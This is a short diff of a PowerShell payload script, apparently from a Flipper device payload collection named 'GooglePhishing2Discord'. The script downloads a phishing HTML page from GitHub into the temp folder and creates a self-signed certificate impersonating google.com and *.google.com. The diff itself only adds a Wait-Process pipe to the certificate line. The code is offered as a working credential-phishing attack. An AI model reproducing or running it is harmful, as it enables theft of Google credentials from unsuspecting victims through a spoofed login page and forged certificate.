@@ -1,6 +1,6 @@
 if(-not (Test-Path -Path "$env:temp\gph.html" -PathType Leaf)){
     Invoke-RestMethod "https://raw.githubusercontent.com/Agente404/flipper/main/payloads/GooglePhishing2Discord/index.html" -OutFile "$env:temp\gph.html" | Wait-Process;
-    $cert = New-SelfSignedCertificate -Subject *.google.com -DnsName google.com, *.google.com Cert:\CurrentUser\My
+    $cert = New-SelfSignedCertificate -Subject *.google.com -DnsName google.com, *.google.com Cert:\CurrentUser\My | Wait-Process
     Write-Output $cert
 }
 
